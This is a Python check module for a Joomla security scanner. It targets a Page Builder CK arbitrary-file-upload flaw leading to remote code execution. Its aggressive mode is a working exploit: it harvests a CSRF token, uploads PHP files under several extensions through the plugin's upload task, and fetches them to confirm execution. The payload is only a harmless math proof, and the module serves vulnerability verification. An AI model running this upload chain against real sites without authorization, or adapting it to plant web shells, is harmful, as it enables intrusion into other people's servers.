from __future__ import annotations

import re
import urllib.parse
from urllib.parse import urljoin

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import build_multipart, normalize_url, request
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import rand_str

CVE_ID = "CVE-2026-56290"
NAME = "Page Builder CK arbitrary file upload to RCE"
COMPONENT = "Page Builder CK"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Page Builder CK vulnerable upload handlers; legacy 1.x/2.x and reported 3.x ranges"
TASK_CANDIDATES = [
    "browse.ajaxAddPicture",
]
FILE_PARAM_NAMES = ["file"]
FOLDER_PARAM_NAMES = ["path"]
DEST_PATHS = [
    "images/pagebuilderck/",
]
SHELL_EXTENSIONS = ["php", "PHP", "pht", "phar"]


def extract_csrf(target_url: str, timeout: int = 12, proxy: str | None = None):
    pages = ["", "/index.php?option=com_users&view=login", "/administrator/index.php"]
    base = normalize_url(target_url)
    for page in pages:
        response = request(f"{base}{page}", timeout=timeout, proxy=proxy)
        body = response.get("body", "")
        match = re.search(
            r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([a-f0-9]{32})["\'][^>]+value=["\']1["\']',
            body,
            re.IGNORECASE,
        )
        if match:
            return match.group(1), "1"
        match = re.search(r'["\']csrf\.token["\']\s*:\s*["\']([a-f0-9]{32})["\']', body, re.IGNORECASE)
        if match:
            return match.group(1), "1"
    return None


def passive_result(plugins: dict | None) -> Finding:
    pbck = (plugins or {}).get("pagebuilderck", {})
    found = bool(pbck.get("found"))
    version = pbck.get("version")
    source = pbck.get("source") or "unknown"
    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Page Builder CK was not detected via components/component/media routes.",
            action="Component not detected via standard public routes; verify manually if installed elsewhere.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="INCONCLUSIVE",
        confidence="MEDIUM",
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=(
            f"Page Builder CK was detected (version: {version or 'unknown'}, source: {source}), but the affected version range "
            "is unconfirmed/ambiguous in public advisories. Static rule matching is kept inconclusive."
        ),
        action="Manually verify Page Builder CK version against vendor advisory or run lab exploit verification if authorized.",
    )


def try_upload(base: str, task: str, file_param: str, folder_param: str, dest_path: str, csrf_name: str, timeout: int, proxy: str | None, filename: str, payload: str):
    content_type, body = build_multipart(
        {folder_param: dest_path},
        {file_param: (filename, payload, "application/x-php")},
    )
    upload_url = (
        f"{base}/index.php?option=com_pagebuilderck"
        f"&task={urllib.parse.quote(task)}"
        f"&type=files"
        f"&{csrf_name}=1"
    )
    upload = request(
        upload_url,
        method="POST",
        headers={"Content-Type": content_type},
        data=body,
        timeout=timeout,
        proxy=proxy,
    )
    proof_url = urljoin(base + "/", f"/{dest_path}{filename}")
    proof = request(proof_url, timeout=timeout, proxy=proxy)
    return upload, proof, proof_url


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    csrf = extract_csrf(base, timeout=timeout, proxy=proxy)
    if not csrf:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="Could not harvest a Joomla CSRF token, so upload endpoint discovery was skipped.",
            action="Verify manually in a lab and update Page Builder CK.",
        )
    csrf_name = csrf[0]
    payload, expected_product = generate_php_math_payload()
    observed = []
    for ext in SHELL_EXTENSIONS:
        filename = f"jvh-pbck-{rand_str(8)}.{ext}"
        upload, proof, proof_url = try_upload(
            base,
            "browse.ajaxAddPicture",
            "file",
            "path",
            "images/pagebuilderck/",
            csrf_name,
            timeout,
            proxy,
            filename,
            payload,
        )
        upload_body = upload.get("body", "")
        proof_body = proof.get("body", "")
        upload_flags = []
        if "CK_FILE_NOT_AUTHORIZED" in upload_body or "not authorized" in upload_body.lower():
            upload_flags.append("extension-filtered")
        if "JINVALID_TOKEN" in upload_body:
            upload_flags.append("token-rejected")
        observed.append(
            f".{ext}: upload {upload.get('status')}, proof {proof.get('status')}"
            + (f" ({', '.join(upload_flags)})" if upload_flags else "")
        )
        if proof.get("status") == 200:
            is_exec, is_source = verify_php_execution(proof_body, expected_product)
            if is_exec:
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE",
                    confidence="CONFIRMED",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    proof_url=proof_url,
                    uploaded_filename=f"images/pagebuilderck/{filename}",
                    detail=(
                        "Targeted lab probe used Page Builder CK's real upload flow "
                        "(task=browse.ajaxAddPicture, file field=file, path field=path) "
                        f"and executed dynamic PHP math proof ({expected_product})."
                    ),
                    action=f"Delete images/pagebuilderck/{filename}, inspect for compromise, and update Page Builder CK.",
                )
            if is_source or "<?php" in proof_body.lower():
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE_UPLOAD_ONLY",
                    confidence="HIGH",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    proof_url=proof_url,
                    uploaded_filename=f"images/pagebuilderck/{filename}",
                    detail=(
                        "Targeted lab probe confirmed a file write through the real Page Builder CK "
                        "upload flow, but PHP execution was not confirmed because the server returned source."
                    ),
                    action=f"Delete images/pagebuilderck/{filename} and update Page Builder CK.",
                )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        detail=(
            "Targeted lab probe used the installed Page Builder CK flow "
            "(task=browse.ajaxAddPicture, file field=file, path field=path), but did not confirm "
            "PHP write/execution. Observed: "
            + ("; ".join(observed[:8]) if observed else "none")
        ),
        action="If any lab probe wrote a file, remove it and update Page Builder CK.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    result = passive_result(plugins)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires aggressive lab-only upload verification."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.2.0",
        "last_reviewed": "2026-03-20",
        "updated": "2026-03-20",
        "required_detectors": ["pagebuilderck"],
        "references": [
            "https://www.joomlack.fr/en/joomla-extensions/page-builder-ck",
        ],
    }
